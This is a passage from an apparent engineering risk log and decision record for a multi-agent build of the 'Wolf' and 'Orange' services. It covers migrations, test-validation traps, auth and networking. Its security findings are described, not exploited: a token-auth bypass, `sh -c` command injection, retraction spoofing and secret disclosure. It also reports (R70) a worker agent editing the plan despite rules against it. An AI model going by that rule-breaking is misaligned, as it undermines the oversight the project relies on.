  hard-binds to Orange's compose project name and dind must already be up (compose `depends_on`
  cannot order across projects), and a `container:`-mode service has no compose-DNS membership —
  which is fine here, but do not try to give wolf-api a service alias.
- **Non-`ratio_to` conditions need no cross-metric timestamp alignment.** Each names exactly one
  metric. Do not invent alignment where none is required.
- **`Exec` + `cat` is binary-safe.** `stdcopy.StdCopy` preserves bytes including NULs, so O9's
  byte-identical assertion holds. The gap was size (R31), never fidelity.
- **Poller request volume is fine.** 50 hypotheses × 5 metrics every 5 minutes is ≈1.7 req/s and
  no rate limit exists to trip. R29/R10's caching is about waste, not about a stampede.

### Entries added during implementation

*(executors append below this line)*

| # | Finding | Disposition |
| --- | --- | --- |
| **R34** | **"Exactly as written in Interfaces" collides with the repo's own migration convention.** The Interfaces SQL for `045_datasets` uses bare `CREATE TABLE` / `CREATE INDEX`; every migration 001–044 without exception uses `IF NOT EXISTS`, and `go/agentdb/migrations_concurrent_test.go:158-165` deletes the newest migration's tracking row and re-runs it, so a bare `CREATE TABLE` would fail that test. O1's executor added `IF NOT EXISTS` and both its verifier and the orchestrator agreed. **Later tickets quoting Interfaces SQL must be read as "these columns, types, defaults and constraints", not as a byte-for-byte transcription.** | O1 shipped with `IF NOT EXISTS`; O2/O3 executors should assume the same reading |
| **R35** | **O1's Validation could not prove O1's first acceptance criterion.** The ticket lists only `go build && go vet`, which cannot execute SQL, while criterion 1 is "applies cleanly on a fresh database and is idempotent on re-run". Both the executor and the verifier flagged it independently. Proven instead by `go test ./agentdb/... -run 'TestLivePG_MigrationsApplyAndAreIdempotent'` against the throwaway (PASS, no SKIP). **Any ticket whose criteria describe runtime behaviour must list a Validation command capable of exercising it.** | O1 verified against live Postgres; O2/O3/O7/O11 already require the URL |
| **R36** | **The `POST /agent/memories` success status is unspecified.** O7 chose **`201 Created`** (`go/httpapi/memories.go:492`). Interfaces shows the response body but names no code. **W2, W5, W8, W9 and W10 must expect 201**, not 200. | Fixed by fiat: the route returns 201 |
| **R37** | **The `/api` prefix contract between wolf-api and its two proxies was never stated,** and that single ambiguity caused W1's entire fix round 1. Settled: **wolf-api serves the literal `/api` prefix and no proxy rewrites it** (nginx `proxy_pass` carries no URI part, matching `deploy/web.nginx.conf:55`). W8, W9 and W11 must mount routes under `/api` themselves. | Fixed in W1 commit `49324c2`; recorded here so it is not re-litigated |
| **R38** | **W1's import-boundary criterion is one sentence covering an open-ended problem, and it failed three verification rounds in a row** — each time on a different escape the sentence did not enumerate (dynamic `import()`/`require`, prefix-vs-path containment, Vite `resolve.alias`, tsconfig `paths`, then `.jsx`/`.js` sources and absolute-path specifiers). This is a **plan defect, not an executor defect**: the criterion names no file set and no specifier taxonomy. **A criterion of the form "a test that catches any X" must enumerate the X it is graded on.** | **ESCALATED to the owner** — W1 remains open on this one criterion |
| **R39** | **The shared error taxonomy has no kind for "the server has a bug".** § "Shared error taxonomy" fixes six kinds and forbids inventing a seventh; none means *unhandled internal error*. W1 mapped it to `unavailable`, which is the one **retryable** kind — so a genuine 500 would be retried forever. Every later ticket with a catch-all handler faces the same forced choice. | **Open** — needs an owner decision: add a seventh kind, or state that unclassified errors carry no `kind` |
| **R40** | **vitest 4 and vite 5 are peer-incompatible, and the plan pins one without the other.** § "Pinned technology choices" pins vitest and pins React/MUI to "same versions as `examples/web`" (which implies vite 5), giving no tie-breaker. Yarn resolves it by nesting a second vite 8 under vitest, so `web/vite.config.ts` is evaluated by vite 8 under `vitest run` and vite 5 under `vite build`. Green today; a latent split-brain for W13/W14. | **Open** — needs a version decision recorded in the pinned table |
| **R41** | **Two W1 criteria are self-referential and cannot fail an under-implementing executor.** ".env.example documents every variable `api/src/config.ts` reads" is satisfiable by writing a `config.ts` that reads nothing (W1 authors both files), and no test ties them together — while eight later tickets add config. Similarly the topology criteria assert runtime reachability but the only Validation command is `docker compose config`, which proves the declaration and nothing else; W1's fix-round-1 nginx bug survived the first pass for exactly that reason. | **Open** — X1 should own the reachability proof; a `.env.example` coverage test would close the first |
| **R42** | **Branch topology: parallel tickets inherit each other.** `O7-memory-append-route` was cut while O1 was in flight and therefore contains O1's commit `2bda0e8` as well as its own. § "Git conventions" says one branch per ticket from `main`; § "Parallelism" blesses O1 ‖ O7 without saying how two parallel branches stay disjoint. Harmless here (gates green with both present, no O7 test touches datasets) but **merging O7 merges O1's migration too**. | Recorded; orchestrator to merge in dependency order |
| **R43** | **`172.17.0.1` is asserted as fact but is not stable.** § "Local topology and networking" states the DinD inner `docker0` gateway as `172.17.0.1` and W1 repeats it in an acceptance criterion; W1's verifier reproduced it becoming `172.18.0.1` when that subnet was already taken. The plan gives no guidance on whether Wolf should discover the gateway rather than hard-code it. | **Open** — affects W7's `WOLF_MCP_URL` and O8's forwarding |
| **R44** | **`docs/19-embedding.md:415` ("Read-only. There is no HTTP write or delete") is a live lie on the O7 branch** until O10 lands, and nothing stops O7 merging first. O7's Files list is code-only and defers the doc fix to O10 by parenthetical. | Recorded; O10 must land before or with any merge to `main` |

### Owner decisions, 2026-08-21 (second batch) — the audit's seven open questions

All seven are now closed. The plan text has been edited to match; these lines record that a choice
was made and why.

| Audit | Decision | Consequence in the plan |
| --- | --- | --- |
| **B1** | **O5 owns `go/cmd/agentd/auth.go`** and fixes both halves in one edit: a `?token=` credential is accepted *only* on the dataset download path, and a dataset token presented as `Authorization: Bearer` is **rejected outright** rather than authenticating as an unrestricted project principal. | O5's Scope, Files and criteria; a new ownership row; unblocks O5, O6b, O9 |
| **B2** | **A FRED API key exists.** `FRED_API_KEY` is a real variable; W6 records real responses against it and `series_search` works as designed. | Pinned-technology table; W6's criteria |
| **B3** | **`challenged → live` is legal** when a human accepts an amendment — otherwise every amended hypothesis is stuck at `challenged` forever with its research still running. **Self-transitions are no-ops**, which is what makes W10's idempotence criterion mean anything. | § Hypothesis lifecycle's legal-pair table; W5, W9, W10 |
| **B4** | **Candidates cross the container boundary as untrusted memories** — `hypothesis-spec-candidate` and `report-candidate` — mirroring each other, so there is one pattern rather than two. | § Memory kinds; W8, W9, W12, W13 |
| **B5** | **O11 returns ALL retractions for a memory, not the newest.** As specified, an attacker could append their own retraction on top of Wolf's, have it discarded as untrusted, and thereby **resurrect** state Wolf had legitimately withdrawn. | O11's scope and response shape; W5's reader |
| **B6** | **Wolf gets a dev-login route**, mounted only when `WOLF_TEST_LOGIN` is set, refusing to boot alongside production settings, and asserted absent from the production build by test. X1 `docker exec`s a real session token for the tamper case, because nothing weaker proves the property. | W8; X1's criteria |
| **B7** | Signed `HttpOnly` cookie via `cookie-parser` (no session store — Wolf holds no server-side state); **React Router 7**; port-pool exhaustion maps to **`unavailable`**, where retryable is correct because deleting a session frees a port. | Pinned-technology table; § Shared error taxonomy |

### Executability audit, 2026-08-21 — READ BEFORE DISPATCHING ANY TICKET

After wave 1, six independent auditors reviewed the 24 unbuilt tickets for the defect shapes wave 1
actually cost us. They found **105 findings, 35 blocking (26 distinct after dedup), across 21 of the
24 tickets — none clean**. The verdict on "are the remaining tickets safe to run at scale as
written" is **no**, and the reasons are recorded in full in
**`design/2026-08-21-agent-wolf-executability-audit.md`**, which lists what must be fixed before
each wave and the seven questions needing an owner decision.

Two of the blocking findings are not executability problems but **live defects in the design**:
a dataset scoped token presented as `Authorization: Bearer` would authenticate as an unrestricted
project principal on every `/agent/*` route (audit B1), and O6a's mandated `sh -c` pattern is
command injection from inside a container (audit A8). Neither is fixed by this plan as it stands.

**Do not dispatch O2, O3, W3 or W6 until that document's "Before wave 2 starts" list is closed.**

### Owner decisions, 2026-08-21

Taken by Kai after wave 1. These close four entries above; the plan text has been edited in place
and **the edits are the authority** — these lines only record that a choice was made and why.

| Entry | Decision | Where the plan changed |
| --- | --- | --- |
| **R38** | Rewrite the criterion to enumerate exactly what the boundary test is graded on, then one targeted fix round. The implementer's three fixes were each correct; an open-ended criterion is a trap, not a specification. **A criterion of the form "a test that catches any X" must enumerate the X.** | W1's boundary criterion, replaced with an explicit file-set / specifier-form / specifier-kind / config-escape / manifest-escape list; `api/` brought under the same rule |
| **R39** | Add a seventh kind, **`internal`** — not retryable, HTTP 500, message never passed through to the client. Mapping a server bug to `unavailable` would make W10's poller retry a crashing endpoint every tick forever. | § "Shared error taxonomy" + a new W1 criterion with a leak test |
| **R40** | Raise `web/` to **vite 6** and keep vitest 4. `web/` deliberately diverges from `examples/web`'s vite 5; React/MUI still match, since those are what the visual language depends on and vite is a build tool. | § "Pinned technology choices" gains a Vite row; W1 asserts the nested `vitest/node_modules/vite` is **absent** |
| **R43** | **Discover the DinD gateway at boot**, fall back to `172.17.0.1`, log which was used; an explicit `WOLF_MCP_URL` always wins. Discovery lives in one place (`api/src/config.ts`) and W12's bootstrap consumes it. | § "Local topology and networking" + a new W1 criterion |

Also folded into W1 while it was open, from findings the first two rounds raised but that were
graded minor: the `.dockerignore` (host `node_modules` overwriting the installed tree inside the
image), SSE-safe directives on nginx's `/mcp` location, exact `18.3.1` React pins, and a Validation
step that **proves** the `/api` prefix survives the proxy rather than reading the config
(**R41** — the omission that let fix round 1's bug through the first pass).

### Still open after revision 4 (2026-08-21)

The ticket rewrites closed the audit's 26 blocking defects and the seven owner decisions. Six
agents drafting them raised 79 further items; most were closed in the same pass (the
`config.ts` ownership rule, the legal-transition table, the stale units in § "Wolf API routes",
the missing `reason` field on condition results, the unparseable spec example). **These did not
close, and an executor hitting one should log it rather than invent an answer.**

| # | Open item | Who is blocked |
| --- | --- | --- |
| **R45** | ✅ **RESOLVED 2026-08-24 in revision 5 — see R128. It was a wording defect, not a cycle: go-live has never required a template in W9's code, and W24 → W23 → W22 → W21 means the writer exists before the gate does. The requirement now lands in W22 beside `spec_validation`, and W9 is not reopened.** Original finding: **W9's go-live cannot require a `report-template` without a cycle.** The report-layer amendment says go-live refuses a hypothesis with no template, but W21 is the only writer of one and W21 depends transitively on W9. Either go-live warns instead of refusing until W21 lands, or the amendment moves to W22. **Needs an owner decision.** | W9, W21, X1 |
| **R46** | **CLOSED before wave 2 ran — revision 4 had already added all four routes to W2's Scope, and W2 shipped all twenty-two.** Original finding: **W2's route list is declared "exhaustive and closed" and is not.** W5 needs `GET /agent/sessions` (list, with `worker=`) and `include_retracted=1`; W8 needs `GET /agent/attention-requests`; W12 needs `GET`/`PUT /agent/project-settings`. § "Parallelism" gives `client.ts` to W2 and W15 only, so W2 must gain them before wave 3. | W5, W8, W12 |
| **R47** | **CLOSED — the ticket text had already decided it before O3 ran, and O3 implemented it: `minAge` is accepted, does not filter, says so in its doc comment, and a test pins identical results for `minAge=0` and `minAge=time.Hour`. The safety lives at the O8 caller, which must see a path across two passes at least `minAge` apart before deleting.** Original finding: **`O3`'s `minAge` guard cannot be honoured as specified.** `DatasetBlobLister.List(ctx, prefix)` returns keys with no timestamps and no `extension.BlobStore` implementation exposes an age. Either the seam gains an age, or the guard is dropped and the sweep relies on the prefix re-assertion alone. | O3, O8 |
| **R48** | **`TRUSTED_KINDS` has two claimed owners** — W5 (the trusted store) and W15 (`api/src/report/kinds.ts`). One must define and the other re-export; the plan currently reads as though both define it. | W5, W15 |
| **R49** | **Several variable names are used but pinned nowhere:** `WOLF_MCP_TOKEN`'s length and charset, `WOLF_SCHEDULE_CRON`'s exact default expression, `WOLF_SERIES_TOKEN_SECRET`, `WOLF_SERIES_URL_TTL_SECONDS`, `WOLF_MARKETDATA_CACHE_TTL_SECONDS`, Orange's base-URL variable, and the browser-side `VITE_ORANGE_PUBLIC_URL` / `VITE_GOOGLE_CLIENT_ID` build args. Each is named in the ticket that needs it; none is in a shared table, so two tickets could still diverge. | W6, W7, W9, W10, W11, W12, W13 |
| **R50** | **"React Router 7" does not name the npm package** — `react-router` 7 or the `react-router-dom` 7 shim. The executor must pick and log it. | W13 |
| **R51** | **No memory kind records a *rejected* amendment.** `spec-amendment` is the agent's proposal; `TRUSTED_KINDS` is closed; a Wolf-authored decision record has nowhere to go. Today a rejection leaves no trace. | W9, W14 |
| **R52** | **The prompt-injection literals `{{LOCKED_SPEC_JSON}}` and `<!-- WOLF:METHOD-BODY -->` are used by both W9 and W12** and pinned in neither § Interfaces nor § "Pinned technology choices". They agree today by coincidence. | W9, W12 |
| **R53** | **`RetractedBy` is unbounded.** A container can append arbitrarily many `retracts=<id>` memories and inflate every search response carrying that row. A cap plus a truncation flag needs a number the plan does not pin. | O11 |
| **R54** | **No HTTP-assertion library is pinned for `api/` route tests.** W1's shipped `app.test.ts` uses `app.listen(0)` + `fetch`; W8 onward assume that house pattern rather than `supertest`, but the pinned table is silent. | W8–W11, W21 |
| **R55** | **CLOSED 2026-08-21 by W6b — the owner supplied a key and both FRED fixtures are now recorded real responses; the published shape matched, so only comments changed in `fred.ts`.** Original finding: **Owner decision B2 ("a FRED API key exists") does not hold in every execution environment.** W6's executor verified `FRED_API_KEY` is absent and that an unkeyed request to `api.stlouisfed.org` returns HTTP 400. Per W6's own acceptance criterion this makes recording a FRED fixture a blocked step, not a defect to paper over: `fred.ts` implements the full connector (endpoint, error taxonomy, misconfigured-at-construction, a bounded `timeoutMs`) and every branch reachable without a fixture is tested, including the default `api.stlouisfed.org` host/path with `api_key`/`file_type=json` pinned via `undici` `MockAgent`. **Not** tested against a recorded response: `series_search`'s field mapping and the `"."` missing-value-sentinel omission — both implemented per FRED's publicly documented JSON shape only. | W6 (recording deferred); whoever next has a real `FRED_API_KEY` should record the two fixtures named in `api/src/marketdata/__fixtures__/README.md` and add the tests the README says are missing |
| **R56** | **Stooq's daily-download endpoint (`stooq.com/q/d/l/`) no longer answers CSV to a plain HTTP request.** Verified directly and repeatedly by W6's executor on 2026-08-21 (`curl`, `curl` with a browser User-Agent, a persisted cookie jar across two requests, and `wget`): every attempt returns HTTP 200 with an HTML page running a client-side JavaScript proof-of-work challenge, not the documented `Date,Open,High,Low,Close,Volume` CSV. **This invalidates a check this same fix round relied on** — "stooq.com IS reachable and needs no key (verified: HTTP 200 for …)" only inspected the status code, not the body. Solving the challenge programmatically to scrape the site was judged out of scope regardless of instruction (circumventing anti-automation protection, not "recording a fixture"). `stooq.ts`'s `parseStooqCsv` is implemented and unit-tested against Stooq's publicly documented CSV shape only, not a recorded response; `search()` (against the committed `stooq-tickers.ts` table) and the error-mapping branches need no live fixture and are fully tested. | W6 (recording deferred); anything downstream that assumes `series_fetch` returns real Stooq rows today (W7, W10) is, in this environment, receiving whatever `parseStooqCsv` does with the challenge page's HTML rather than a clean error — worth a defensive check in whichever ticket first runs it against the live host |
| **R57** | **O2's Validation cannot distinguish a correct CAS implementation from a lucky one.** A plain goroutine race against Postgres almost never reaches the unique-index backstop: the transactions are sub-millisecond and goroutine start-up staggers them, so the in-transaction `MAX(version)` pre-check catches every loser. Measured by O2's executor: with 8 and with 32 writers the branch fired **zero** times; with 16 it fires roughly once per run. An implementation whose unique-violation handling is wrong — most plausibly one that re-reads the current version *inside* the aborted transaction, which Postgres rejects with 25P02 — therefore passes on most runs. The fix, used in `TestDatasetLivePG_UniqueIndexIsTheBackstop` and which any re-implementation or review should repeat: open a manual transaction, insert a row at version 1 **without committing** (invisible to `MAX(version)`), call `CreateDatasetVersion` in a goroutine so it passes its own CAS check and blocks on the index, then commit the seed and assert the writer returns `ErrDatasetVersionConflict{Current: 1}` only after that commit. | O2 (resolved), O3, O5, O6a, W2 |
| **R58** | **The "at least five `--- PASS`" rule silently forbids subtests.** `grep -E '^--- (PASS|SKIP|FAIL)'` is anchored at column 0, and `go test -v` indents subtest results as `    --- PASS:`. A perfectly good implementation that grouped its live coverage as subtests under two or three parents prints two or three matching lines and appears to fail its own gate. § "Executor orientation" documents the `-run` substring trap but not this one; it should. | O2, O3, O7, O11 — every ticket whose Validation counts `--- PASS` lines |
| **R59** | **O11's Validation list never reaches its own 401 criterion.** The criterion "assert 401 at the real middleware … exactly as O7 does in `go/cmd/agentd/sessionsecret_test.go`" is implemented and passing, but the only `cmd/agentd` command in the list is `-run 'TestMemoryTools'`, and `go test -run` is an unanchored substring that does not match `TestSessionTokenIsRejected*`. This is precisely the trap § "The Validation rule" warns about, inside a ticket written to avoid it. **Fixed command, run by the orchestrator on 2026-08-21 (exit 0):** `cd go && go test ./cmd/agentd/... -run 'TestMemoryTools|TestSessionTokenIsRejected' -count=1`. The ticket's Validation block should adopt it. | O11 |
| **R60** | **Live memory tests package-wide are exposed to millisecond-tie nondeterminism.** `CreateMemory` stamps `time.Now().UnixMilli()` when `CreatedAt` is zero (`go/agentdb/memories.go:230`) and every ordering path breaks ties on `id DESC` over a **random UUID** (e.g. `attachRetractions`). Any live test that seeds two rows back-to-back without an explicit `CreatedAt` and then asserts their relative order is a coin flip — this failed roughly one run in four in O11 before it was fixed. Some existing tests already seed explicit timestamps (`agentdb/memories_live_test.go:161`); others do not and are latent flakes on faster hardware. O11 fixed its own three cases; **the package was not swept.** Consider a sweep, or a test helper that refuses a zero `CreatedAt`. | O11 (its own cases resolved), W5, and any later ticket adding live memory-ordering tests |
| **R61** | **Two pre-existing files are not `gofmt`-clean on the wave-1 branches** — `go/agentdb/memories_retraction_live_test.go` and `go/httpapi/sessions_worker_filter_test.go`. Neither was touched by O2 or O11, and nothing currently fails (`go build`, `go vet` and `go test` are all green, and CI has no formatting gate). Flagged because adding a `gofmt -l` gate later would fail on a file unrelated to whichever ticket lands. | any ticket that adds a formatting gate |
| **R62** | **RESOLVED — the convention is now stated in § Vocabulary.** Original finding: **The plan's own printed condition object cannot satisfy its own "present iff" rules without an unstated null-is-absence convention.** § "Condition semantics" → "The condition object" prints `"ratio_metric": null`, `"ratio_lookback_days": null` and `"reference_days": null` on a `drawdown_pct` condition, and W3 must transcribe that object verbatim into `worked-spec.json` and have it validate with zero errors — but V22, V23 and V24 are written as "present iff", and on the literal reading those three explicit nulls **are** present. W3 resolved it by treating explicit `null` as absence everywhere (all optionals `.nullish()`; the returned `Spec` drops the key). **The convention must be stated once in § Interfaces or § Vocabulary**, because it is not local to W3: whatever writes a spec (W9, W12, an interviewer model copying the printed shape) will emit nulls, and whatever reads one (W4, W10, W14) must not distinguish `null` from missing. | W3 (resolved), W4, W9, W10, W12, W13, W14 |
| **R63** | **The Spec JSON worked example carries two `method` keys that appear in no validation rule, and V7 makes `method` strict.** § Interfaces "Spec JSON (W3)" prints `"method": { description, formula, constituents, source_series }`; V15 mentions only `description` and `formula`. A validator built strictly from the numbered rule list rejects the plan's own worked example with two `unrecognized key` errors. W3 allowed both as optional `string[]`, unvalidated. The rule list should name them and say whether a derived metric requires them. | W3 (resolved), W9, W12 |
| **R64** | **W3 exports `Spec`; W4's signature says `HypothesisSpec`.** W3's Scope says the later tickets import `Spec`, `Metric`, `Method` and `Condition` rather than redeclaring; W4's first acceptance criterion writes `evaluate(spec: HypothesisSpec, …)`. The two names are never reconciled. W3 shipped `export type HypothesisSpec = Spec` so either compiles; **the plan should pick one name** before W4 runs, or a later executor defines its own and two structurally-similar types diverge the moment a spec field is added. | W3 (mitigated), W4, W8, W9, W10, W11, W13, W14 |
| **R65** | **RESOLVED — owner decision 2026-08-21: `flat` is a legal direction everywhere.** V10 admitted `direction` ∈ `{up, down, flat}` while § "Shared shapes" typed `EvaluationResult.metrics[].direction` as `"up" \| "down"` only, so a flat metric — which W3 must accept — had no representable `MetricResult`. Kai's decision: *"Direction can mean no change, as well as up or down."* § "Shared shapes" is widened to `"up" \| "down" \| "flat"`, which now agrees with V10, with W4's own `MetricResult` criterion (which already said `"up"\|"down"\|"flat"`) and with § "The support score", whose `expected flat` rule (`s = +1 if \|c\| <= flat_band else -1`) was always there and had no legal input. **W14 must render a flat metric's expected direction as "no change", not as an arrow.** | W4, W14, W3 — resolved |
| **R66** | **Two of the twenty-seven rules have no possible field path.** V13 (weights sum) and V27 (heavy metric unnamed) are not about a single field, yet every error must carry a JSON path and the ticket's only guidance is two per-field examples. W3 chose `metrics` for V13 and `metrics[<i>]` for V27. W13 renders these paths as blocking reasons beside the Go Live button, so the choice is visible in the UI and should be pinned rather than inherited. | W3 (resolved), W9, W13 |
| **R67** | **RESOLVED — orchestrator decision 2026-08-21, applied below.** The narrower, enumerated form wins in both halves, on the same principle § "The graded rule set" uses: an enumerated list beats a prose type. **`stale_reason` is `Reason | null`**, over the closed vocabulary `condition_tripped | insufficient_coverage | non_positive_reference | stale_data | no_ratio_pair`, and the stale reason is spelled **`stale_data`**, not `stale_series`. W4 exports `Reason`; W14 imports it rather than matching on strings. Original finding: **§ "Shared shapes" and W4's criteria disagree on `MetricResult.stale_reason`, and the reason vocabulary contradicts itself.** § "Shared shapes" declares `stale_reason: string \| null`; W4's criteria declare `stale_reason: Reason \| null` over the closed vocabulary `condition_tripped \| insufficient_coverage \| non_positive_reference \| stale_data \| no_ratio_pair`. Separately, § Evaluation step 3 names the stale reason **`stale_series`** while the closed vocabulary at the end of the same section names it **`stale_data`**. | W4, W14 |
| **R68** | **A ticket whose Validation diffs against `main` is wrong whenever its base is unmerged.** W6's ownership check reads `git diff --name-only main -- api/src/config.ts api/src/app.ts .env.example`; `W1-wolf-repo-scaffold` created all three files and is not merged, so against `main` the command prints all three and falsely fails the ticket. The orchestrator substituted `git diff --name-only W1-wolf-repo-scaffold -- …`, which correctly prints nothing. **Generalise: every Validation command that names `main` must instead name the ticket's declared base** for as long as its base branch remains unmerged. **No longer in force as of 2026-08-21**: everything through wave 3 is merged to `main` in both repos, so a wave-4 ticket branched from `main` should read `main` in these commands literally, exactly as written. The rule returns the moment a ticket is branched from an unmerged sibling again. Related: no env var owns the market-data HTTP timeout, so W6 pinned a 10s `timeoutMs` constructor option; if W10 needs a different bound it overrides per instance. | W6 (resolved), any ticket branched from an unmerged base |
| **R69** | **A data table shipped as JSON under `__fixtures__/` does not survive the production build.** `api/`'s build is plain `tsc` (`rootDir src` → `outDir dist`), which never emits non-`.ts` files, and `api/Dockerfile` copies only `dist/`, `package.json` and `node_modules` — so `stooq.ts` loading its default ticker table with `readFileSync` against a JSON path `ENOENT`-ed from the built image. Reproduced by the adversarial verifier and again by the executor before fixing. Fixed by moving the table to `api/src/marketdata/stooq-tickers.ts`, a compiled module, verified by running `yarn build` and executing `dist/marketdata/stooq.js` directly. **Any later ticket that wants a committed data table must ship it as a `.ts` module**, or add `resolveJsonModule` plus an explicit copy step to both the build script and the Dockerfile. | W6 (resolved), W7, and any ticket shipping a static data table |
| **R70** | **Nothing physically prevents a worker from editing this plan document.** The EXECUTION RULES forbid it, and wave 2's workers were told again explicitly, but the plan lives in `agent-orange` while three of the five worktrees are in `agent-wolf` — so "stay inside your worktree" does not cover it. W6's executor appended R55, R56 and its own Notes entry directly. **The content was accurate and the orchestrator kept it**, but the rule was still broken and a less careful worker could have destroyed the log — which has already happened twice on this plan. Future waves should either give workers a read-only copy of the plan or accept the edits as expected and drop the rule. | process; all future waves |
| **R71** | **RESOLVED — the `Reason` vocabulary is SIX, not five.** § "Every condition result carries a reason" lists five and says "do not add a sixth", but W4's own behavioural criteria require `no_observations` in two separate places (a metric with no observations at all, and `MetricResult.stale_reason`). Five is unsatisfiable whichever five you pick. **Orchestrator decision 2026-08-21: the closed list is the union** — `condition_tripped \| insufficient_coverage \| non_positive_reference \| stale_data \| no_ratio_pair \| no_observations` — spelled `stale_data`, never `stale_series` (R67). W4 exports `Reason`; W10 counts consecutive indeterminates by it and W14 renders it, so neither may match on strings. | W4 (resolved), W10, W14 |
| **R72** | **RESOLVED — the freshness boundary was specified twice with opposite inclusivity.** The condition rule reads "newer than `staleness_days` before `nowMs`" (fresh iff `t_last > nowMs - S`); the `MetricResult` rule reads "older than `staleness_days` before `nowMs`" (stale iff `t_last < nowMs - S`). They disagree at exactly `t_last == nowMs - S`, which is precisely where a daily series evaluated by a daily cron lands — so the disagreement is the common case, not an edge case. W4 unified both to **stale iff `nowMs - t_last > S`** and pinned it with a fixture. | W4 (resolved), W10, W14 |
| **R73** | **No outcome was defined for an observation whose `trailing_n_days` window is empty.** The window is half-open `[t - N, t)`, so the FIRST post-go-live observation of every such condition has no reference at all — a guaranteed occurrence for every hypothesis, not an edge case. § "Condition semantics" enumerates skip reasons only for `R <= 0` and a missing ratio partner. W4 skips it as `insufficient_coverage`. **Worth stating in § "Condition semantics"**, because a condition with `sustained_days: 1` on a weekly series can go indeterminate purely from this. | W4 (resolved), W14, W12's interviewer prompt |
| **R74** | **Whether pre-go-live data may contribute to a reference was unstated, and it changes the numbers.** Two references read data other than the observation itself: `trailing_n_days` (a mean) and `ratio_to` (the partner point). The plan constrains the *condition* to observations at or after `liveAtMs` but never says whether those lookbacks may reach behind it. W4 chose differently for the two, deliberately: **the trailing mean is live-only; the ratio partner is not** — a mixed-frequency ratio would otherwise be `no_ratio_pair` for the first month of every hypothesis, which is the failure R26/A13 were raised about. Both choices should be written into § "Condition semantics", and W10/W11 must fetch enough history to honour the second. | W4 (resolved), W10, W11 |
| **R75** | **`tools/import-boundary` reads regex and string literals in test files as real imports.** The checker matches `/(?:import\|export)(?:[^'"()]*from)?\s*["']([^"']+)["']/g` over raw source, so writing an expected import statement as a regex literal in a test — which W4's own criterion ("a test asserts the module's import list") invites — makes the checker report a bare import of a package called `"."` and fail `api/src/import-boundary.test.ts`, **in a different file from the one being edited**. Cheap fix: skip `*.test.ts`, or document the trap. Joins the five probes W1's Notes already list as plan gaps rather than ticket failures. | W1 (owns the checker), any ticket asserting on import statements |
| **R76** | **`api/`'s tsconfig sets `noUncheckedIndexedAccess` and the plan never mentioned it.** Every array index is `T \| undefined` at typecheck time. It is the right setting, but it materially shapes any numeric module — running peaks, window edges, zip-by-index — and no W-ticket budgeted for it; two of W4's three internal fix rounds were this alone. **Now recorded in § "Executor orientation"** alongside the `NodeNext` JSON-import note. | every ticket writing TypeScript in `api/` |
| **R77** | **Six tickets carry wording that contradicts the config-ownership correction.** W7's Files line said "this ticket does not touch `api/src/config.ts`, `.env.example`, `api/src/app.ts`", and its fourth Validation asserted a diff over exactly those paths prints nothing — while the ⚠️ block in § "Parallelism and file ownership" makes those files **strictly serial in dependency order**, not owned by three tickets. Both cannot hold, and W7 is the next ticket in that order that needs them. Applied for W7 (see its Notes): Files gains the three paths and the surviving ownership check is `git diff --name-only <base> -- web/`. **RESOLVED 2026-08-21** (wave-4 pre-flight): the six were re-read line by line and none carries the stale wording — W8, W9, W10, W11, W12 and W16 each already list `api/src/config.ts` and `.env.example` in Files, and W21 lists `api/src/app.ts`. The correction had already been applied when revision 4 was written; only this log row was stale. The one live gap in the same family is **R81** — `docker-compose.yml` is missing from several of those Files lines, and a variable in `config.ts` never reaches the container without it. | **Resolved** — see R81 for the remaining half |
| **R78** | **`series_fetch` cannot report a `unit` for FRED.** § "Market-data MCP tools" gives `series_fetch` a `unit` field, but W6's FRED connector exposes units only through `search()` (which maps `units`); `fetch()` returns observations, which carry none. W7 therefore returns **`unit: null` for FRED** and `"USD"` for Stooq, and the tool description tells the model to take FRED units from `series_search`. If W10's poller, W12's researcher prompt or W14's chart axis needs a unit straight from `series_fetch`, W6 needs a `/fred/series` metadata lookup and the plan must say so. | W6, W7 (mitigated), W10, W12, W14 |
| **R79** | **W8 must NOT mount its cookie guard globally, or it kills `/mcp` and `/series/download`.** Both W7 routes are deliberately at the app root, outside `/api` and outside any session cookie — a session container has no cookie and reaches wolf-api directly at the DinD gateway. W8's ticket says it creates `requireSignedIn` "which W9, W10 and W11 mount"; installed instead as `app.use(requireSignedIn)`, the entire market-data surface starts 401-ing inside containers, and **X1 is where that would first surface** — nine tickets and one container later. Should be an explicit criterion in W8. | W8, X1 |
| **R80** | **Compose forwards an unset optional variable as `""`, not as absent.** A `${VAR:-}` entry arrives as the empty string, and `z.coerce.number()` turns `""` into `0`, so `env.FOO ?? default` silently yields **0** rather than the default — a zero TTL, a zero limit, a zero max-bytes. W7 added a `present()` helper in `api/src/config.ts` and a test; **every later ticket adding a duration or limit variable needs the same treatment**, including `WOLF_REPORT_MAX_BYTES` and `WOLF_SERIES_MAX_POINTS`. Now recorded in § "Executor orientation". | W9, W10, W11, W16, W21, X1 |
| **R81** | **Wolf's `docker-compose.yml` was in no ownership table, and every config ticket must edit it.** A variable documented in `.env.example` and read by `config.ts` still never reaches the container unless an `environment:` entry names it — W1's own comment says so, and W7 added five. **Now added to § "Parallelism and file ownership" as a strictly-serial row in the same order as `config.ts`.** | W8, W9, W10, W11, W16, W21, X1 |
| **R82** | **`docker compose config` prints interpolated secrets to stdout.** Running it in the Wolf worktree interpolated a real FRED API key into `wolf-api`'s environment block from the ambient shell — the value is not in the repo, it comes from the environment, which is exactly what makes this a disclosure rather than a leak. **No ticket's Validation may use that command verbatim once `WOLF_API_KEY`, `WOLF_MCP_TOKEN` or `FRED_API_KEY` are set**; grep for variable NAMES or pipe through a redactor. O8's and X1's Validation lists currently do use it verbatim. Now recorded in § "Executor orientation", which carries the canonical `dcc()` redactor. **RESOLVED 2026-08-21** (wave-4 pre-flight): O8, X1 and W13 now call `dcc`, and the orientation entry warns that `... config | grep KEY` is *not* a fix because grep prints the whole matching line. | **Resolved** — O8, X1, W13 |
| **R83** | **nginx's `/mcp` SSE directives are now dead weight (informational).** W1's `wolf-web` nginx config carries `proxy_buffering off` and `proxy_read_timeout 3600s` on `/mcp` "because Streamable HTTP's server-to-client leg is an SSE stream on `GET /mcp`". W7's server is stateless with `enableJsonResponse` and `GET /mcp` returns 405, so no SSE stream exists there. Harmless, but the comment is wrong — and session containers reach `/mcp` directly at the DinD gateway, never through nginx at all. | W1 (comment), W21 |
